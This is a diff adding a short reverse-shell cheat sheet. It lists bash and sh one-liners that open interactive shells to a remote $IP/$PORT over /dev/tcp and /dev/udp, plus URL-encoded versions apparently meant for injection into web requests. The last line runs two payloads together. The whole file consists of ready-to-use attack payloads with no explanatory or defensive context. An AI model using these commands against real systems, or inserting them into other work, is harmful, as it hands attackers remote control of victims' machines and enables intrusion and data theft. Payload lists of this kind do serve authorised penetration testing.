@@ -1,0 +1,15 @@
+BASH TCP
+bash -i >& /dev/tcp/$IP/$PORT
+bash -l > /dev/tcp/$IP/$PORT 0<&1 2>&1
+bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1'
+sh -i 5<> /dev/tcp/$IP/$PORT 0<&5 1>&5 2>&5
+bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+0>&1 0<&196;exec 196<>/dev/tcp/$IP/$PORT; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/$IP/$PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
+BASH UDP
+sh -i >& /dev/udp/$IP/$PORT 0>&1
+BASH URL ENCODING
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$IP%2F$PORT%200%3E%261%22
+bash%20-l%20%3E%20/dev/tcp/$IP/$PORT%200%3C&1%202%3E&1
+bash%20-i%20%3E&%20/dev/tcp/$IP/$PORT
+bash%20-c%20'exec%20bash%20-i%20&%3E/dev/tcp/$IP/$PORT%20%3C&1'bash%20-i%20%3E&%20/dev/tcp/$IP/$PORT
